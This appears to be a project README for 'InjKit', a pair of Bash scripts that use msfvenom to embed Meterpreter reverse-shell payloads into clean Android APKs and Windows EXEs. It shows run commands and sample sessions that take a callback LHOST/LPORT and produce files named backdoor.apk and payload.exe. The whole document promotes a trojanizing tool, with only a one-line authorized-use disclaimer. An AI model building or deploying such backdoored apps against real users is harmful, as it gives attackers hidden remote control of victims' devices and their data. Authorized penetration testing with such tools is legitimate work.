# InjKit


Payload Injector Toolkit (APK & EXE)

This toolkit provides two simple yet effective Bash scripts that allow you to inject meterpreter reverse shell payloads into clean APK or EXE files using msfvenom.


---

📁 Included Scripts

1. apk_injector.sh — Android APK Injector

Injects a reverse shell payload into a clean APK file using Metasploit’s msfvenom.

🔧 Features:

Simple interactive interface

Verifies APK file path before processing

Uses msfvenom to inject payload

Outputs a new APK file with embedded payload


🚀 Example Usage:

chmod +x apk_injector.sh
./apk_injector.sh

🖥️ Sample Terminal Interaction:

===============================
        APK Payload Injector   
===============================

🌐 Enter LHOST: 192.168.1.100

🎯 Enter LPORT: 4444

Enter the path to a clean APK file: /root/app.apk

Enter the output file name (e.g., evil.apk): backdoor.apk

[*] Injecting payload into /root/app.apk...

[+] Payload injected successfully! Saved as: backdoor.apk


---

2. exe_injector.sh — Windows EXE Injector

Injects a reverse shell payload into a clean EXE file using Metasploit’s msfvenom.

🔧 Features:

Interactive prompts for easy setup

Validates input EXE file path

Supports any EXE (e.g., notepad.exe) as a base

Uses msfvenom for injection

Generates new malicious EXE


🚀 Example Usage:

chmod +x exe_injector.sh
./exe_injector.sh

🖥️ Sample Terminal Interaction:

===============================
      EXE Payload Injector     
===============================

🌐 Enter LHOST: 192.168.1.100

🎯 Enter LPORT: 5555

Enter the path to a clean EXE file (e.g., notepad.exe): /root/notepad.exe

Enter the output file name (e.g., evil.exe): payload.exe

[*] Injecting payload into /root/notepad.exe...

[+] Payload injected successfully! Saved as: payload.exe


---

⚠️ Notes

These tools rely on msfvenom, part of the Metasploit Framework.

Make sure msfvenom is installed and accessible in your PATH.

Use within ethical boundaries and only in environments you are authorized to test.



---

💬 Feedback

Feel free to submit issues, improvements, or suggestions.
Made with ❤️ for educational and penetration testing use.

---
